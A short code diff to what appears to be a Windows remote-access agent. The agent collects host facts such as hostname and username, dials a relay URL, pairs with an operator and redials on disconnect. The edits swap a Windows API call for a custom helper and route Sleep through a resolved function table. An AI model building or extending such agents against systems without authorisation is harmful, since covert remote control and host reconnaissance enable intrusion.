@@ -115,7 +115,7 @@ static DWORD handle_hello(HINTERNET socket)
     LOG_INFO("OS version %s, hostname %s, user %s\n",
              facts.os_version, facts.hostname, facts.username);
              CHAR buffer[128];
-             
+
     unsigned char frame[IDENTITY_FRAME_SIZE];
     int frame_len = build_identity_frame(frame, &facts);
 
@@ -268,11 +268,11 @@ int main(int argc, CHAR *argv[])
     }
 
     WCHAR url[2048];
-    if (MultiByteToWideChar(CP_ACP, 0, argv[1], -1, url, 2048) == 0) {
-        LOG_ERROR("MultiByteToWideChar(URL)", kernel.GetLastError());
+    if (AnsiToWide(argv[1], url, 2048) == -1) {
+        LOG_ERROR("AnsiToWide(URL) failed\n");
         return 1;
     }
-
+    
     /* ----- The agent loop: dial, serve, redial. A lost connection is a
      * normal event (the relay drops agent sockets when the paired operator
      * disconnects, deploys recycle the Durable Object, idle NATs time out);
@@ -300,7 +300,7 @@ int main(int argc, CHAR *argv[])
                 backoff_pos++;
 
             LOG_INFO("[i] connection lost - redialing in %d s ...\n", wait_s);
-            Sleep((DWORD)wait_s * 1000);
+            kernel.Sleep((DWORD)wait_s * 1000);
         }
     }
     return rc;
